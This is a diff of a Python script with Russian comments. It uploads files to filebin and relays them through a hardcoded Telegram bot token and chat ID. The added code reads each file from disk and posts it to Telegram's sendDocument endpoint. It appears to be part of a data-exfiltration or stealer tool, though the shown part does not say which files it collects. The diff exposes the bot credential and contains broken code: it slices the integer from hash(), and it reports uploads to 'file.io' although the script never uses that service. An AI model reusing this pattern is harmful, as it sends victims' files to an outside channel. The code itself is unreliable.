@@ -15,25 +15,42 @@ def upload_file_to_filebin(file_path):
         print("Ошибка загрузки файла")
         return None
 
-def send_telegram_message(message, file_links):
+def send_telegram_message(message, file_paths):
     """
     Отправляет сообщение в Telegram с файлами (ссылками)
     """
     tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
     tg_chat_id = '-1002403648422'
     
+    # Формируем ссылку на Telegram API
     url = f'https://api.telegram.org/bot{tg_bot_token}/sendMessage'
     
     # Формируем сообщение с ссылками на файлы
-    message += "\n\n" + "\n".join([f"Ссылка на файл: {link}" for link in file_links])
+    message += "\n\n" + "\n".join([f"Ссылка на файл: {file}" for file in file_paths])
 
     payload = {
         'chat_id': tg_chat_id,
         'text': message
     }
     
+    # Отправка сообщения
     response = requests.post(url, data=payload)
-    return response.ok
+    
+    # Если нужно отправить сам файл, используем следующий код:
+    file_urls = []
+    for file_path in file_paths:
+        with open(file_path, 'rb') as file:
+            files = {
+                'chat_id': tg_chat_id,
+                'document': (os.path.basename(file_path), file)
+            }
+            send_file_url = f'https://api.telegram.org/bot{tg_bot_token}/sendDocument'
+            send_response = requests.post(send_file_url, files=files)
+            if send_response.status_code == 200:
+                print(f"Файл {file_path} отправлен.")
+                file_urls.append(file_path)  # Добавим файл, если успешно отправлен
+    
+    return response.ok, file_urls
 
 def main():
     try:
@@ -56,10 +73,16 @@ def main():
             message += f"------------------\n"
             message += f"#{hash('192.168.1.1')[:8]}"
             
-            if send_telegram_message(message, file_links):
+            # Отправка сообщений и файлов
+            success, sent_files = send_telegram_message(message, file_links)
+            if success:
                 print("Message sent successfully!")
             else:
                 print("Error sending message.")
+            
+            # Если файлы успешно загружены на сервер, отправляем их
+            if sent_files:
+                print("Successfully uploaded files to file.io:", sent_files)
         else:
             print("No files uploaded.")
     
